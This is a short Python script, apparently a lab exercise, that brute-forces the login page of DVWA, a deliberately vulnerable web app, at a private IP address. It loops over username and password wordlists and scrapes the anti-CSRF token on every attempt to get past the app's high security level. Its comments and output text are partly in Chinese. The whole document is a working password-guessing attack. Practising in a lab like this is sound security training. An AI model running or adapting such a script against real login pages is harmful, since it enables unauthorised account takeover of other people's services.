# -*- coding: utf-8 -*-
# author = 'K0ctr'


import requests
# import re
from bs4 import BeautifulSoup

ip = "192.168.203.128"
headers = {
    # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Cookie": "security=high; PHPSESSID=5c6sgq0cclaer2tdpi6iep1m62"
}

"""
# name只会循环一次，为什么？因为内层文件循环到最后，无法再返回第一行，于是内层循环到最后，不再执行print，
# 因此需要用设置seek(0)
names = open("small.txt","r",encoding="utf-8")
pwds = open("common_pass.txt","r",encoding="utf-8")
for u in names:
    pwds.seek(0)
    for p in pwds:
        print(u.strip(), p.strip())
pwds.close()
names.close()
"""
names = open("small.txt", 'r', encoding="utf-8")
passwords = open("common_pass.txt", 'r', encoding='utf-8')
for username in names:
    passwords.seek(0)
    for password in passwords:
        url = "http://%s/dvwa/vulnerabilities/brute/" % ip
        r = requests.get(url, headers=headers)
        soup = BeautifulSoup(r.text, "html.parser")
        token = soup.find_all("input")[3].get("value")
        # token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", r.text)[0]
        get_data = {
            "user_token": token,
            "username": username.strip(),
            "password": password.strip(),
            "Login": "Login"
        }
        print('-' * 20)
        print('用户名：', username.strip())
        print('密码：', password.strip())
        r = requests.get(url, params=get_data, headers=headers)
        if 'Username and/or password incorrect.' in r.text:
            print('破解失败')
        else:
            print('破解成功')
        print('-' * 20)
passwords.close()
names.close()
